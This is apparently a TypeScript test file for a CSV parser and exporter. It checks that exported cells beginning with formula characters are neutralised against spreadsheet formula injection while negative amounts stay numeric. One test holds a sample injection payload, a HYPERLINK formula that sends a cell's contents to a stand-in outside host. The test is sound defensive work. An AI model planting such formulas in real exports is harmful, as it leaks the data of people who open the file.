import { expect, test } from "bun:test";
import { parseCsv, toCsv } from "./csv";

/**
 * The only test `parseCsv` had anywhere in the repository lived in the
 * accounting module's own `pro.test.ts`, a local re-export away from the
 * function it was actually testing. That file left with the rest of the
 * paid half of Accounting; this is the genuine home for it, since nothing
 * here is accounting-specific — a bank statement, a mailing list and a
 * shop's export all read through this same parser.
 */
test("a quoted field keeps its commas", () => {
  const rows = parseCsv('a,"b,c",d\n1,2,3');
  expect(rows[0]).toEqual(["a", "b,c", "d"]);
  expect(rows[1]).toEqual(["1", "2", "3"]);
});

/**
 * A cell a spreadsheet runs instead of reading.
 *
 * Excel, LibreOffice and Sheets all treat a cell beginning `=`, `+`, `-`,
 * `@`, tab or carriage return as a formula. That is a quoting curiosity until
 * you notice where these rows come from: the CRM's contacts are fed by a form
 * embedded on the business's own public website, which anybody can fill in.
 * A visitor whose name is a formula has written it into the business's export,
 * and it runs when somebody double-clicks the file.
 */
test("a name that is a formula is text by the time it reaches a spreadsheet", () => {
  const csv = toCsv(
    ["Name"],
    [['=HYPERLINK("http://elsewhere.example"&A1,"Invoice")']],
  );
  // The apostrophe is what Excel drops and shows nothing for; what matters is
  // that the cell no longer begins with `=`.
  expect(csv).toContain("'=HYPERLINK");
  expect(csv).not.toMatch(/(^|,|")=HYPERLINK/);
});

test("every character a spreadsheet takes as a formula is covered", () => {
  for (const start of ["=", "+", "@", "\t", "\r"]) {
    const csv = toCsv(["Name"], [[`${start}danger`]]);
    expect([start, csv.includes(`'${start}danger`)]).toEqual([start, true]);
  }
});

/**
 * And not at the cost of the books. A bookkeeping product exports negative
 * money constantly, and a column of `'-1234.56` is a column that no longer
 * adds up — which would be a worse bug than the one above, because nobody
 * would see it.
 */
test("a negative number is still a number", () => {
  const csv = toCsv(["Amount"], [["-1234.56"], [-90], ["-7"]]);
  expect(csv).not.toContain("'");
  expect(csv).toContain("-1234.56");
  expect(csv).toContain("-90");
});

/** A phone number is not a number, and quoting it is what stops Excel
 * turning `+44 1248 555 0123` into something else entirely. */
test("a phone number keeps its plus", () => {
  const csv = toCsv(["Phone"], [["+44 1248 555 0123"]]);
  expect(csv).toContain("'+44 1248 555 0123");
});
